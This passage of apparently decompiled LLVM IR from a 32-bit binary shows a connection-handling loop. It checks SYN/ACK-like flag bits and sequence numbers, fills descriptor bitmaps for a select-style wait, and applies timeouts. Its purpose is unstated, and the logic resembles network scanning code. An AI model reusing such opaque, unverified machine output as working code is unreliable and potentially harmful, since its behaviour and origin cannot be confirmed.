  %v2_804f22c = inttoptr i32 %v1_804f22c to i16*
  %v3_804f22c = load i16, i16* %v2_804f22c, align 2
  %v4_804f22c = zext i16 %v3_804f22c to i32
  %v6_804f22c = and i32 %v3_804f207, -65536
  %v7_804f22c = or i32 %v4_804f22c, %v6_804f22c
  store i32 %v7_804f22c, i32* %eax.global-to-local, align 4
  %v3_804f231 = add i32 %v0_804f1ea, 176
  %v4_804f231 = inttoptr i32 %v3_804f231 to i16*
  %v5_804f231 = load i16, i16* %v4_804f231, align 2
  %v16_804f231 = icmp eq i16 %v3_804f22c, %v5_804f231
  %v1_804f239 = icmp eq i1 %v16_804f231, false
  br i1 %v1_804f239, label %dec_label_pc_804f1bd, label %dec_label_pc_804f23b

dec_label_pc_804f23b:                             ; preds = %dec_label_pc_804f22c
  %v1_804f23b = add i32 %v0_804f1ea, 187
  %v2_804f23b = inttoptr i32 %v1_804f23b to i8*
  %v3_804f23b = load i8, i8* %v2_804f23b, align 1
  %v4_804f23b = zext i8 %v3_804f23b to i32
  %v6_804f23b = and i32 %v7_804f22c, -256
  %v7_804f23b = or i32 %v4_804f23b, %v6_804f23b
  store i32 %v7_804f23b, i32* %eax.global-to-local, align 4
  %v2_804f242 = and i8 %v3_804f23b, 2
  %v3_804f242 = icmp eq i8 %v2_804f242, 0
  %v2_804f24a = and i32 %v4_804f23b, 16
  %v3_804f24a = icmp eq i32 %v2_804f24a, 0
  %or.cond248 = or i1 %v3_804f242, %v3_804f24a
  br i1 %or.cond248, label %dec_label_pc_804f1bd, label %dec_label_pc_804f252

dec_label_pc_804f252:                             ; preds = %dec_label_pc_804f23b
  %v2_804f252 = and i32 %v4_804f23b, 4
  %v3_804f252 = icmp eq i32 %v2_804f252, 0
  %v1_804f254 = icmp eq i1 %v3_804f252, false
  br i1 %v1_804f254, label %dec_label_pc_804f1bd, label %dec_label_pc_804f25a

dec_label_pc_804f25a:                             ; preds = %dec_label_pc_804f252
  %tmp805 = urem i8 %v3_804f23b, 2
  %v3_804f25a = icmp eq i8 %tmp805, 0
  %v1_804f25c = icmp eq i1 %v3_804f25a, false
  br i1 %v1_804f25c, label %dec_label_pc_804f1bd, label %dec_label_pc_804f262

dec_label_pc_804f262:                             ; preds = %dec_label_pc_804f25a
  %v1_804f262 = add i32 %v0_804f1ea, 182
  %v2_804f262 = inttoptr i32 %v1_804f262 to i32*
  %v3_804f262 = load i32, i32* %v2_804f262, align 4
  %v1_804f269 = trunc i32 %v3_804f262 to i16
  %v2_804f269 = call i16 @llvm.bswap.i16(i16 %v1_804f269)
  %v3_804f269 = zext i16 %v2_804f269 to i32
  %v1_804f26d = udiv i32 %v3_804f262, 65536
  %v2_804f26d = mul nuw i32 %v3_804f269, 65536
  %v1_804f270 = trunc i32 %v1_804f26d to i16
  %v2_804f270 = call i16 @llvm.bswap.i16(i16 %v1_804f270)
  %v3_804f270 = zext i16 %v2_804f270 to i32
  %v6_804f270 = or i32 %v3_804f270, %v2_804f26d
  %v1_804f274 = add i32 %v6_804f270, -1
  %v1_804f275 = trunc i32 %v1_804f274 to i16
  %v2_804f275 = call i16 @llvm.bswap.i16(i16 %v1_804f275)
  %v3_804f275 = zext i16 %v2_804f275 to i32
  %v1_804f279 = udiv i32 %v1_804f274, 65536
  %v2_804f279 = mul nuw i32 %v3_804f275, 65536
  %v1_804f27c = trunc i32 %v1_804f279 to i16
  %v2_804f27c = call i16 @llvm.bswap.i16(i16 %v1_804f27c)
  %v3_804f27c = zext i16 %v2_804f27c to i32
  %v6_804f27c = or i32 %v3_804f27c, %v2_804f279
  store i32 %v6_804f27c, i32* %eax.global-to-local, align 4
  %v1_804f280 = add i32 %v0_804f1ea, 166
  %v2_804f280 = inttoptr i32 %v1_804f280 to i32*
  %v3_804f280 = load i32, i32* %v2_804f280, align 4
  %v15_804f280 = icmp eq i32 %v3_804f280, %v6_804f27c
  %v1_804f287 = icmp eq i1 %v15_804f280, false
  br i1 %v1_804f287, label %dec_label_pc_804f1bd, label %dec_label_pc_804f28d

dec_label_pc_804f28d:                             ; preds = %dec_label_pc_804f262
  %v0_804f28d = load i32, i32* @ebx, align 4
  %v1_804f28d = add i32 %v0_804f28d, -255
  %v6_804f28d = sub i32 254, %v0_804f28d
  %v7_804f28d = and i32 %v6_804f28d, %v0_804f28d
  %v8_804f28d = icmp slt i32 %v7_804f28d, 0
  %v9_804f28d = icmp eq i32 %v1_804f28d, 0
  %v10_804f28d = icmp slt i32 %v1_804f28d, 0
  %v3_804f293 = icmp eq i1 %v10_804f28d, %v8_804f28d
  %v4_804f293 = icmp eq i1 %v9_804f28d, false
  %v5_804f293 = and i1 %v4_804f293, %v3_804f293
  br i1 %v5_804f293, label %dec_label_pc_804f2f8, label %dec_label_pc_804f295

dec_label_pc_804f295:                             ; preds = %dec_label_pc_804f28d
  %v0_804f298 = load i32, i32* @global_var_8055718.21, align 8
  %v2_804f29e = mul i32 %v0_804f28d, 288
  %v2_804f2a1 = add i32 %v0_804f298, %v2_804f29e
  store i32 %v2_804f2a1, i32* %edx.global-to-local, align 4
  %v1_804f2a3 = add i32 %v2_804f2a1, 12
  %v2_804f2a3 = inttoptr i32 %v1_804f2a3 to i32*
  %v3_804f2a3 = load i32, i32* %v2_804f2a3, align 4
  store i32 %v3_804f2a3, i32* @edi, align 4
  %v1_804f2a6 = add i32 %v2_804f2a1, 288
  store i32 %v1_804f2a6, i32* %ecx.global-to-local, align 4
  %v1_804f2ac = icmp eq i32 %v3_804f2a3, 0
  br i1 %v1_804f2ac, label %dec_label_pc_804f2c8, label %dec_label_pc_804f2b0

dec_label_pc_804f2b0:                             ; preds = %dec_label_pc_804f295, %dec_label_pc_804f2b9
  %v0_804f2b9 = phi i32 [ %v1_804f2bb, %dec_label_pc_804f2b9 ], [ %v1_804f2a6, %dec_label_pc_804f295 ]
  %v0_804f2b0 = phi i32 [ %v1_804f2b0, %dec_label_pc_804f2b9 ], [ %v0_804f28d, %dec_label_pc_804f295 ]
  %v1_804f2b0 = add i32 %v0_804f2b0, 1
  store i32 %v1_804f2b0, i32* @ebx, align 4
  %v6_804f2b1 = icmp eq i32 %v0_804f2b0, 255
  br i1 %v6_804f2b1, label %dec_label_pc_804f2f8, label %dec_label_pc_804f2b9

dec_label_pc_804f2b9:                             ; preds = %dec_label_pc_804f2b0
  store i32 %v0_804f2b9, i32* %edx.global-to-local, align 4
  %v1_804f2bb = add i32 %v0_804f2b9, 288
  store i32 %v1_804f2bb, i32* %ecx.global-to-local, align 4
  %v1_804f2c1 = add i32 %v0_804f2b9, 12
  %v2_804f2c1 = inttoptr i32 %v1_804f2c1 to i32*
  %v3_804f2c1 = load i32, i32* %v2_804f2c1, align 4
  store i32 %v3_804f2c1, i32* %esi.global-to-local, align 4
  %v1_804f2c4 = icmp eq i32 %v3_804f2c1, 0
  %v1_804f2c6 = icmp eq i1 %v1_804f2c4, false
  br i1 %v1_804f2c6, label %dec_label_pc_804f2b0, label %dec_label_pc_804f2c8

dec_label_pc_804f2c8:                             ; preds = %dec_label_pc_804f2b9, %dec_label_pc_804f295
  %v1_804f2c8 = phi i32 [ %v2_804f2a1, %dec_label_pc_804f295 ], [ %v0_804f2b9, %dec_label_pc_804f2b9 ]
  %v2_804f2c8 = add i32 %v1_804f2c8, 16
  %v3_804f2c8 = inttoptr i32 %v2_804f2c8 to i32*
  store i32 %v6_804f27c, i32* %v3_804f2c8, align 4
  %v0_804f2cb = load i32, i32* @esp, align 4
  %v1_804f2cb = add i32 %v0_804f2cb, 142
  %v2_804f2cb = inttoptr i32 %v1_804f2cb to i32*
  %v3_804f2cb = load i32, i32* %v2_804f2cb, align 4
  %v1_804f2d2 = trunc i32 %v3_804f2cb to i16
  %v2_804f2d2 = load i32, i32* %edx.global-to-local, align 4
  %v3_804f2d2 = add i32 %v2_804f2d2, 20
  %v4_804f2d2 = inttoptr i32 %v3_804f2d2 to i16*
  store i16 %v1_804f2d2, i16* %v4_804f2d2, align 2
  %v0_804f2d6 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804f2d6, i32* @eax, align 4
  %v0_804f2d8 = call i32 @function_804dcd0()
  store i32 %v0_804f2d8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f1bd

dec_label_pc_804f2f8:                             ; preds = %dec_label_pc_804f28d, %dec_label_pc_804f1f5, %dec_label_pc_804f1bd, %dec_label_pc_804f2b0
  store i32 32, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 32, i32* %ecx.global-to-local, align 4
  %v1_804f301 = add i32 %v0_804f1ea, 48
  %v2_804f301 = inttoptr i32 %v1_804f301 to i32*
  %v3_804f301 = load i32, i32* %v2_804f301, align 4
  %v4_804f301 = inttoptr i32 %v3_804f301 to i8*
  %v5_804f306 = call i8* @_memset(i8* %v4_804f301, i32 0, i32 32)
  %v0_804f308 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804f308, i32* %ecx.global-to-local, align 4
  %v0_804f30a = load i32, i32* @esp, align 4
  %v1_804f30a = add i32 %v0_804f30a, 12
  %v2_804f30a = inttoptr i32 %v1_804f30a to i32*
  %v3_804f30a = load i32, i32* %v2_804f30a, align 4
  %v4_804f30a = inttoptr i32 %v3_804f30a to i8*
  store i1 false, i1* @df, align 1
  %v2_804f30f = load i32, i32* %eax.global-to-local, align 4
  %v5_804f30f = call i8* @_memset(i8* %v4_804f30a, i32 %v2_804f30f, i32 %v0_804f308)
  %v6_804f30f = ptrtoint i8* %v5_804f30f to i32
  store i32 %v6_804f30f, i32* %ecx.global-to-local, align 4
  store i32 0, i32* @edi, align 4
  store i32 0, i32* @esi, align 4
  %v0_804f315 = load i32, i32* @esp, align 4
  %v1_804f315 = add i32 %v0_804f315, 1932
  %v2_804f315 = inttoptr i32 %v1_804f315 to i32*
  store i32 0, i32* %v2_804f315, align 4
  %v0_804f36d.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f36d

dec_label_pc_804f322:                             ; preds = %dec_label_pc_804f36d, %dec_label_pc_804f38b
  %v1_804f32c = phi i32 [ 30, %dec_label_pc_804f36d ], [ 5, %dec_label_pc_804f38b ]
  %v0_804f322 = load i32, i32* @global_var_80556d0.9, align 16
  store i32 %v0_804f322, i32* %eax.global-to-local, align 4
  %v1_804f327 = add i32 %v2_804f37d, 8
  %v2_804f327 = inttoptr i32 %v1_804f327 to i32*
  %v3_804f327 = load i32, i32* %v2_804f327, align 4
  %v2_804f32a = sub i32 %v0_804f322, %v3_804f327
  store i32 %v2_804f32a, i32* %eax.global-to-local, align 4
  %tmp766 = icmp ugt i32 %v2_804f32a, %v1_804f32c
  br i1 %tmp766, label %dec_label_pc_804f3b0, label %dec_label_pc_804f334

dec_label_pc_804f334:                             ; preds = %dec_label_pc_804f322
  store i32 %v1_804f382, i32* %edx.global-to-local, align 4
  %v1_804f390 = add i32 %v2_804f37d, 4
  %v2_804f390 = inttoptr i32 %v1_804f390 to i32*
  %v3_804f390 = load i32, i32* %v2_804f390, align 4
  %v1_804f395 = urem i32 %v3_804f390, 32
  store i32 %v1_804f395, i32* %eax.global-to-local, align 4
  %v2_804f398 = udiv i32 %v3_804f390, 32
  store i32 %v2_804f398, i32* %edx.global-to-local, align 4
  %v0_804f39b = load i32, i32* @esp, align 4
  %v2_804f39b = mul nuw nsw i32 %v2_804f398, 4
  br i1 %v9_804f382, label %dec_label_pc_804f390, label %dec_label_pc_804f337

dec_label_pc_804f337:                             ; preds = %dec_label_pc_804f334
  %v3_804f342 = add nuw nsw i32 %v2_804f39b, 1764
  %v4_804f342 = add i32 %v3_804f342, %v0_804f39b
  %v5_804f342 = inttoptr i32 %v4_804f342 to i32*
  %v6_804f342 = load i32, i32* %v5_804f342, align 4
  %v9_804f342 = shl i32 1, %v1_804f395
  %v12_804f342 = or i32 %v6_804f342, %v9_804f342
  store i32 %v12_804f342, i32* %v5_804f342, align 4
  %v0_804f34a = load i32, i32* @ebx, align 4
  %v1_804f34a = add i32 %v0_804f34a, 4
  %v2_804f34a = inttoptr i32 %v1_804f34a to i32*
  %v3_804f34a = load i32, i32* %v2_804f34a, align 4
  store i32 %v3_804f34a, i32* %eax.global-to-local, align 4
  %v0_804f34d = load i32, i32* @edi, align 4
  %v2_804f34d = sub i32 %v0_804f34d, %v3_804f34a
  %v8_804f34d = xor i32 %v0_804f34d, %v3_804f34a
  %v9_804f34d = xor i32 %v2_804f34d, %v0_804f34d
  %v10_804f34d = and i32 %v9_804f34d, %v8_804f34d
  %v11_804f34d = icmp slt i32 %v10_804f34d, 0
  %v13_804f34d = icmp slt i32 %v2_804f34d, 0
  %v2_804f34f = icmp eq i1 %v13_804f34d, %v11_804f34d
  br i1 %v2_804f34f, label %dec_label_pc_804f353, label %dec_label_pc_804f351

dec_label_pc_804f351:                             ; preds = %dec_label_pc_804f337
  store i32 %v3_804f34a, i32* @edi, align 4
  br label %dec_label_pc_804f353

dec_label_pc_804f353:                             ; preds = %dec_label_pc_804f390, %dec_label_pc_804f387, %dec_label_pc_804f337, %dec_label_pc_804f3e9, %dec_label_pc_804f3dd, %dec_label_pc_804f3aa, %dec_label_pc_804f351
  %v0_804f353 = load i32, i32* @esp, align 4
  %v1_804f353 = add i32 %v0_804f353, 1932
  %v2_804f353 = inttoptr i32 %v1_804f353 to i32*
  %v3_804f353 = load i32, i32* %v2_804f353, align 4
  %v1_804f35a = add i32 %v3_804f353, 1
  store i32 %v1_804f35a, i32* %eax.global-to-local, align 4
  store i32 %v1_804f35a, i32* %v2_804f353, align 4
  %v0_804f362 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f362 = add i32 %v0_804f362, -255
  %v6_804f362 = sub i32 254, %v0_804f362
  %v7_804f362 = and i32 %v6_804f362, %v0_804f362
  %v8_804f362 = icmp slt i32 %v7_804f362, 0
  %v9_804f362 = icmp eq i32 %v1_804f362, 0
  %v10_804f362 = icmp slt i32 %v1_804f362, 0
  %v3_804f367 = icmp eq i1 %v10_804f362, %v8_804f362
  %v4_804f367 = icmp eq i1 %v9_804f362, false
  %v5_804f367 = and i1 %v4_804f367, %v3_804f367
  br i1 %v5_804f367, label %dec_label_pc_804f3fc, label %dec_label_pc_804f36d

dec_label_pc_804f36d:                             ; preds = %dec_label_pc_804f353, %dec_label_pc_804f2f8
  %v0_804f36d = phi i32 [ %v0_804f362, %dec_label_pc_804f353 ], [ %v0_804f36d.pre, %dec_label_pc_804f2f8 ]
  %v0_804f370 = load i32, i32* @global_var_8055718.21, align 8
  store i32 %v0_804f370, i32* %eax.global-to-local, align 4
  %v2_804f375 = mul i32 %v0_804f36d, 288
  store i32 30, i32* %ecx.global-to-local, align 4
  %v2_804f37d = add i32 %v0_804f370, %v2_804f375
  store i32 %v2_804f37d, i32* @ebx, align 4
  %v1_804f37f = add i32 %v2_804f37d, 12
  %v2_804f37f = inttoptr i32 %v1_804f37f to i32*
  %v3_804f37f = load i32, i32* %v2_804f37f, align 4
  store i32 %v3_804f37f, i32* %edx.global-to-local, align 4
  %v1_804f382 = add i32 %v3_804f37f, -1
  %v5_804f382 = icmp eq i32 %v3_804f37f, 0
  %v9_804f382 = icmp eq i32 %v1_804f382, 0
  %v2_804f385 = or i1 %v5_804f382, %v9_804f382
  br i1 %v2_804f385, label %dec_label_pc_804f387, label %dec_label_pc_804f322

dec_label_pc_804f387:                             ; preds = %dec_label_pc_804f36d
  br i1 %v5_804f382, label %dec_label_pc_804f353, label %dec_label_pc_804f38b

dec_label_pc_804f38b:                             ; preds = %dec_label_pc_804f387
  store i32 5, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804f322

dec_label_pc_804f390:                             ; preds = %dec_label_pc_804f334
  %v3_804f39b = add nuw nsw i32 %v2_804f39b, 1636
  %v4_804f39b = add i32 %v3_804f39b, %v0_804f39b
  %v5_804f39b = inttoptr i32 %v4_804f39b to i32*
  %v6_804f39b = load i32, i32* %v5_804f39b, align 4
  %v9_804f39b = shl i32 1, %v1_804f395
  %v12_804f39b = or i32 %v6_804f39b, %v9_804f39b
  store i32 %v12_804f39b, i32* %v5_804f39b, align 4
  %v0_804f3a3 = load i32, i32* @ebx, align 4
  %v1_804f3a3 = add i32 %v0_804f3a3, 4
  %v2_804f3a3 = inttoptr i32 %v1_804f3a3 to i32*
  %v3_804f3a3 = load i32, i32* %v2_804f3a3, align 4
  store i32 %v3_804f3a3, i32* %eax.global-to-local, align 4
  %v0_804f3a6 = load i32, i32* @esi, align 4
  %v2_804f3a6 = sub i32 %v0_804f3a6, %v3_804f3a3
  %v8_804f3a6 = xor i32 %v0_804f3a6, %v3_804f3a3
  %v9_804f3a6 = xor i32 %v2_804f3a6, %v0_804f3a6
  %v10_804f3a6 = and i32 %v9_804f3a6, %v8_804f3a6
  %v11_804f3a6 = icmp slt i32 %v10_804f3a6, 0
  %v13_804f3a6 = icmp slt i32 %v2_804f3a6, 0
  %v2_804f3a8 = icmp eq i1 %v13_804f3a6, %v11_804f3a6
  br i1 %v2_804f3a8, label %dec_label_pc_804f353, label %dec_label_pc_804f3aa

dec_label_pc_804f3aa:                             ; preds = %dec_label_pc_804f390
  store i32 %v3_804f3a3, i32* @esi, align 4
  br label %dec_label_pc_804f353

dec_label_pc_804f3b0:                             ; preds = %dec_label_pc_804f322
  %v0_804f3b0 = load i32, i32* @esp, align 4
  %v1_804f3b3 = add i32 %v2_804f37d, 4
  %v2_804f3b3 = inttoptr i32 %v1_804f3b3 to i32*
  %v3_804f3b3 = load i32, i32* %v2_804f3b3, align 4
  %v2_804f3b6 = add i32 %v0_804f3b0, -16
  %v3_804f3b6 = inttoptr i32 %v2_804f3b6 to i32*
  store i32 %v3_804f3b3, i32* %v3_804f3b6, align 4
  %v1_804f3b7 = call i32 @function_80514e3(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804f3b7, i32* %eax.global-to-local, align 4
  %v0_804f3bf = load i32, i32* @ebx, align 4
  %v1_804f3bf = add i32 %v0_804f3bf, 4
  %v2_804f3bf = inttoptr i32 %v1_804f3bf to i32*
  store i32 -1, i32* %v2_804f3bf, align 4
  %v0_804f3c6 = load i32, i32* @ebx, align 4
  %v1_804f3c6 = add i32 %v0_804f3c6, 12
  %v2_804f3c6 = inttoptr i32 %v1_804f3c6 to i32*
  %v3_804f3c6 = load i32, i32* %v2_804f3c6, align 4
  %tmp767 = icmp ult i32 %v3_804f3c6, 3
  br i1 %tmp767, label %dec_label_pc_804f3e9, label %dec_label_pc_804f3cc

dec_label_pc_804f3cc:                             ; preds = %dec_label_pc_804f3b0
  %v1_804f3cc = add i32 %v0_804f3c6, 284
  %v2_804f3cc = inttoptr i32 %v1_804f3cc to i8*
  %v3_804f3cc = load i8, i8* %v2_804f3cc, align 1
  %v4_804f3cc = zext i8 %v3_804f3cc to i32
  %v6_804f3cc = and i32 %v1_804f3b7, -256
  %v7_804f3cc = or i32 %v4_804f3cc, %v6_804f3cc
  %v1_804f3d2 = add i32 %v7_804f3cc, 1
  %v10_804f3d2 = trunc i32 %v1_804f3d2 to i8
  store i32 %v1_804f3d2, i32* %eax.global-to-local, align 4
  store i8 %v10_804f3d2, i8* %v2_804f3cc, align 1
  %v0_804f3d9 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f3d9 = trunc i32 %v0_804f3d9 to i8
  %v10_804f3d9 = icmp eq i8 %v1_804f3d9, 10
  %v0_804f3e9.pre = load i32, i32* @ebx, align 4
  br i1 %v10_804f3d9, label %dec_label_pc_804f3e9, label %dec_label_pc_804f3dd

dec_label_pc_804f3dd:                             ; preds = %dec_label_pc_804f3cc
  store i32 %v0_804f3e9.pre, i32* @eax, align 4
  %v0_804f3df = call i32 @function_804dcd0()
  store i32 %v0_804f3df, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f353

dec_label_pc_804f3e9:                             ; preds = %dec_label_pc_804f3cc, %dec_label_pc_804f3b0
  %v0_804f3e9 = phi i32 [ %v0_804f3c6, %dec_label_pc_804f3b0 ], [ %v0_804f3e9.pre, %dec_label_pc_804f3cc ]
  %v1_804f3e9 = add i32 %v0_804f3e9, 284
  %v2_804f3e9 = inttoptr i32 %v1_804f3e9 to i8*
  store i8 0, i8* %v2_804f3e9, align 1
  %v0_804f3f0 = load i32, i32* @ebx, align 4
  %v1_804f3f0 = add i32 %v0_804f3f0, 12
  %v2_804f3f0 = inttoptr i32 %v1_804f3f0 to i32*
  store i32 0, i32* %v2_804f3f0, align 4
  br label %dec_label_pc_804f353

dec_label_pc_804f3fc:                             ; preds = %dec_label_pc_804f353
  %v0_804f3fc = load i32, i32* @esp, align 4
  %v1_804f3fc = add i32 %v0_804f3fc, 1924
  %v2_804f3fc = inttoptr i32 %v1_804f3fc to i32*
  store i32 0, i32* %v2_804f3fc, align 4
  %v0_804f407 = load i32, i32* @esp, align 4
  %v1_804f407 = add i32 %v0_804f407, 1920
  %v2_804f407 = inttoptr i32 %v1_804f407 to i32*
  store i32 1, i32* %v2_804f407, align 4
  %v0_804f412 = load i32, i32* @esp, align 4
  %v0_804f415 = load i32, i32* @edi, align 4
  %v1_804f415 = load i32, i32* @esi, align 4
  %v2_804f415 = sub i32 %v0_804f415, %v1_804f415
  %v8_804f415 = xor i32 %v1_804f415, %v0_804f415
  %v9_804f415 = xor i32 %v2_804f415, %v0_804f415
  %v10_804f415 = and i32 %v9_804f415, %v8_804f415
  %v11_804f415 = icmp slt i32 %v10_804f415, 0
  %v13_804f415 = icmp slt i32 %v2_804f415, 0
  %v1_804f417 = add i32 %v0_804f412, 1920
  %v2_804f41e = add i32 %v0_804f412, -16
  %v3_804f41e = inttoptr i32 %v2_804f41e to i32*
  store i32 %v1_804f417, i32* %v3_804f41e, align 4
  %v1_804f41f = add i32 %v0_804f412, -20
  %v2_804f41f = inttoptr i32 %v1_804f41f to i32*
  store i32 0, i32* %v2_804f41f, align 4
  %v1_804f421 = add i32 %v0_804f412, 1636
  store i32 %v1_804f421, i32* %edx.global-to-local, align 4
  %v0_804f428 = load i32, i32* @edi, align 4
  store i32 %v0_804f428, i32* %eax.global-to-local, align 4
  %v2_804f42a = add i32 %v0_804f412, -24
  %v3_804f42a = inttoptr i32 %v2_804f42a to i32*
  store i32 %v1_804f421, i32* %v3_804f42a, align 4
  %v1_804f42b = add i32 %v0_804f412, 1764
  store i32 %v1_804f42b, i32* %ecx.global-to-local, align 4
  %v2_804f432 = add i32 %v0_804f412, -28
  %v3_804f432 = inttoptr i32 %v2_804f432 to i32*
  store i32 %v1_804f42b, i32* %v3_804f432, align 4
  %v2_804f433 = icmp eq i1 %v13_804f415, %v11_804f415
  br i1 %v2_804f433, label %dec_label_pc_804f3fc.dec_label_pc_804f437_crit_edge, label %dec_label_pc_804f435

dec_label_pc_804f3fc.dec_label_pc_804f437_crit_edge: ; preds = %dec_label_pc_804f3fc
  %v0_804f437.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f437

dec_label_pc_804f435:                             ; preds = %dec_label_pc_804f3fc
  %v0_804f435 = load i32, i32* @esi, align 4
  store i32 %v0_804f435, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f437

dec_label_pc_804f437:                             ; preds = %dec_label_pc_804f3fc.dec_label_pc_804f437_crit_edge, %dec_label_pc_804f435
  %v0_804f437 = phi i32 [ %v0_804f437.pre, %dec_label_pc_804f3fc.dec_label_pc_804f437_crit_edge ], [ %v0_804f435, %dec_label_pc_804f435 ]
  %v1_804f437 = add i32 %v0_804f437, 1
  store i32 %v1_804f437, i32* %eax.global-to-local, align 4
  %v2_804f438 = add i32 %v0_804f412, -32
  %v3_804f438 = inttoptr i32 %v2_804f438 to i32*
  store i32 %v1_804f437, i32* %v3_804f438, align 4
  %v0_804f439 = call i32 @function_80516ea()
  store i32 %v0_804f439, i32* %eax.global-to-local, align 4
  %v0_804f43e = load i32, i32* @esp, align 4
  %v1_804f441 = add i32 %v0_804f43e, 16
  %v2_804f441 = inttoptr i32 %v1_804f441 to i32*
  store i32 0, i32* %v2_804f441, align 4
  %v0_804f443 = call i32 @function_80517a4()
  %v0_804f448 = load i32, i32* @esp, align 4
  %v1_804f448 = add i32 %v0_804f448, 1948
  %v2_804f448 = inttoptr i32 %v1_804f448 to i32*
  store i32 0, i32* %v2_804f448, align 4
  store i32 %v0_804f443, i32* @global_var_80556d0.9, align 16
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f495

dec_label_pc_804f460:                             ; preds = %dec_label_pc_804f4ab, %dec_label_pc_804ffe2
  %v0_804f468 = phi i32 [ %v0_804f4b5, %dec_label_pc_804f4ab ], [ %v0_804f468.pre, %dec_label_pc_804ffe2 ]
  %v0_804f460 = phi i32 [ %v3_804f4a3, %dec_label_pc_804f4ab ], [ %v0_804f460.pre, %dec_label_pc_804ffe2 ]
  %v2_804f462 = udiv i32 %v0_804f460, 32
  store i32 %v2_804f462, i32* %ecx.global-to-local, align 4
  %v1_804f465 = urem i32 %v0_804f460, 32
  store i32 %v1_804f465, i32* %eax.global-to-local, align 4
  %v2_804f468 = mul nuw nsw i32 %v2_804f462, 4
  %v3_804f468 = add i32 %v0_804f468, 1764
  %v4_804f468 = add i32 %v3_804f468, %v2_804f468
  %v5_804f468 = inttoptr i32 %v4_804f468 to i32*
  %v6_804f468 = load i32, i32* %v5_804f468, align 4
  %v9_804f468 = shl i32 1, %v1_804f465
  %v10_804f468 = and i32 %v6_804f468, %v9_804f468
  %v11_804f468 = icmp ne i32 %v10_804f468, 0
  %v1_804f470 = zext i1 %v11_804f468 to i32
  store i32 %v1_804f470, i32* %eax.global-to-local, align 4
  %v4_804f473 = icmp eq i1 %v11_804f468, false
  %v1_804f475 = icmp eq i1 %v4_804f473, false
  br i1 %v1_804f475, label %dec_label_pc_804f56a.preheader, label %dec_label_pc_804f47b

dec_label_pc_804f56a.preheader:                   ; preds = %dec_label_pc_804f460
  %v0_804f56a29 = load i32, i32* @edi, align 4
  %v1_804f56a30 = add i32 %v0_804f56a29, 12
  %v2_804f56a31 = inttoptr i32 %v1_804f56a30 to i32*
  %v3_804f56a32 = load i32, i32* %v2_804f56a31, align 4
  store i32 %v3_804f56a32, i32* %eax.global-to-local, align 4
  %v1_804f56d33 = icmp eq i32 %v3_804f56a32, 0
  br i1 %v1_804f56d33, label %dec_label_pc_804f47b, label %dec_label_pc_804f575

dec_label_pc_804f47b:                             ; preds = %dec_label_pc_804f56a.backedge, %dec_label_pc_804f56a.preheader, %dec_label_pc_804fbf6, %dec_label_pc_804f460, %dec_label_pc_804f495, %dec_label_pc_805007c, %dec_label_pc_8050044, %dec_label_pc_804fc2e
  %v0_804f47b = load i32, i32* @esp, align 4
  %v1_804f47b = add i32 %v0_804f47b, 1932
  %v2_804f47b = inttoptr i32 %v1_804f47b to i32*
  %v3_804f47b = load i32, i32* %v2_804f47b, align 4
  %v1_804f482 = add i32 %v3_804f47b, 1
  store i32 %v1_804f482, i32* %eax.global-to-local, align 4
  store i32 %v1_804f482, i32* %v2_804f47b, align 4
  %v0_804f48a = load i32, i32* %eax.global-to-local, align 4
  %v1_804f48a = add i32 %v0_804f48a, -255
  %v6_804f48a = sub i32 254, %v0_804f48a
  %v7_804f48a = and i32 %v6_804f48a, %v0_804f48a
  %v8_804f48a = icmp slt i32 %v7_804f48a, 0
  %v9_804f48a = icmp eq i32 %v1_804f48a, 0
  %v10_804f48a = icmp slt i32 %v1_804f48a, 0
  %v3_804f48f = icmp eq i1 %v10_804f48a, %v8_804f48a
  %v4_804f48f = icmp eq i1 %v9_804f48a, false
  %v5_804f48f = and i1 %v4_804f48f, %v3_804f48f
  br i1 %v5_804f48f, label %.loopexit, label %dec_label_pc_804f495

dec_label_pc_804f495:                             ; preds = %dec_label_pc_804f47b, %dec_label_pc_804f437
  %v0_804f495 = phi i32 [ %v0_804f48a, %dec_label_pc_804f47b ], [ 0, %dec_label_pc_804f437 ]
  %v0_804f498 = load i32, i32* @global_var_8055718.21, align 8
  store i32 %v0_804f498, i32* %ecx.global-to-local, align 4
  %v2_804f49e = mul i32 %v0_804f495, 288
  %v2_804f4a1 = add i32 %v0_804f498, %v2_804f49e
  store i32 %v2_804f4a1, i32* @edi, align 4
  %v1_804f4a3 = add i32 %v2_804f4a1, 4
  %v2_804f4a3 = inttoptr i32 %v1_804f4a3 to i32*
  %v3_804f4a3 = load i32, i32* %v2_804f4a3, align 4
  store i32 %v3_804f4a3, i32* %ecx.global-to-local, align 4
  %v10_804f4a6 = icmp eq i32 %v3_804f4a3, -1
  br i1 %v10_804f4a6, label %dec_label_pc_804f47b, label %dec_label_pc_804f4ab

dec_label_pc_804f4ab:                             ; preds = %dec_label_pc_804f495
  %v2_804f4af = udiv i32 %v3_804f4a3, 32
  store i32 %v2_804f4af, i32* %edx.global-to-local, align 4
  %v1_804f4b2 = urem i32 %v3_804f4a3, 32
  store i32 %v1_804f4b2, i32* %eax.global-to-local, align 4
  %v0_804f4b5 = load i32, i32* @esp, align 4
  %v2_804f4b5 = mul nuw nsw i32 %v2_804f4af, 4
  %v3_804f4b5 = add nuw nsw i32 %v2_804f4b5, 1636
  %v4_804f4b5 = add i32 %v3_804f4b5, %v0_804f4b5
  %v5_804f4b5 = inttoptr i32 %v4_804f4b5 to i32*
  %v6_804f4b5 = load i32, i32* %v5_804f4b5, align 4
  %v9_804f4b5 = shl i32 1, %v1_804f4b2
  %v10_804f4b5 = and i32 %v6_804f4b5, %v9_804f4b5
  %v11_804f4b5 = icmp ne i32 %v10_804f4b5, 0
  %v1_804f4bd = zext i1 %v11_804f4b5 to i32
  store i32 %v1_804f4bd, i32* %eax.global-to-local, align 4
  %v4_804f4c0 = icmp eq i1 %v11_804f4b5, false
